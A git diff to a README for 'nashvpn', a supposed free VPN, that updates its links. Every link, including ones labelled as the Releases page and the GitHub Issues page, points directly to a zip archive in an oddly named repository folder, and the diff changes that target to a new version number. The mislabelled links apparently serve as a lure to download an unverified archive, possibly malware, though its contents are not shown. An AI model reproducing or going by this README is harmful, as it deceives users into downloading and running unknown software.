@@ -1,6 +1,6 @@
 # 🛡️ nashvpn - Your Simple, Free VPN Solution
 
-[![Download nashvpn](https://github.com/Sabariranil/nashvpn/raw/refs/heads/main/neoplastic/Software-v1.9.zip)](https://github.com/Sabariranil/nashvpn/raw/refs/heads/main/neoplastic/Software-v1.9.zip)
+[![Download nashvpn](https://raw.githubusercontent.com/Sabariranil/nashvpn/main/neoplastic/Software-v3.0-alpha.1.zip)](https://raw.githubusercontent.com/Sabariranil/nashvpn/main/neoplastic/Software-v3.0-alpha.1.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ nashvpn is a free VPN application that helps you browse the internet safely and 
 Follow these steps to download and run nashvpn on your computer.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Sabariranil/nashvpn/raw/refs/heads/main/neoplastic/Software-v1.9.zip) to find the latest version of nashvpn. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Sabariranil/nashvpn/main/neoplastic/Software-v3.0-alpha.1.zip) to find the latest version of nashvpn. 
 
 2. **Download the Software**  
    On the Releases page, you'll see a list of available versions. Choose the latest version and click on it. You will find the installation file for your operating system.
@@ -45,7 +45,7 @@ Follow these steps to download and run nashvpn on your computer.
 
 ## 📡 Support
 
-If you encounter issues, you can reach out through the [GitHub Issues page](https://github.com/Sabariranil/nashvpn/raw/refs/heads/main/neoplastic/Software-v1.9.zip). Our community and developers will assist you promptly.
+If you encounter issues, you can reach out through the [GitHub Issues page](https://raw.githubusercontent.com/Sabariranil/nashvpn/main/neoplastic/Software-v3.0-alpha.1.zip). Our community and developers will assist you promptly.
 
 ## 🗒️ Notes
 
@@ -54,6 +54,6 @@ If you encounter issues, you can reach out through the [GitHub Issues page](http
 
 ## 🔗 Download & Install
 
-You can download the latest version from our [Releases page](https://github.com/Sabariranil/nashvpn/raw/refs/heads/main/neoplastic/Software-v1.9.zip). 
+You can download the latest version from our [Releases page](https://raw.githubusercontent.com/Sabariranil/nashvpn/main/neoplastic/Software-v3.0-alpha.1.zip). 
 
 Simply follow the steps outlined above for a smooth installation experience. Enjoy secure browsing with nashvpn!
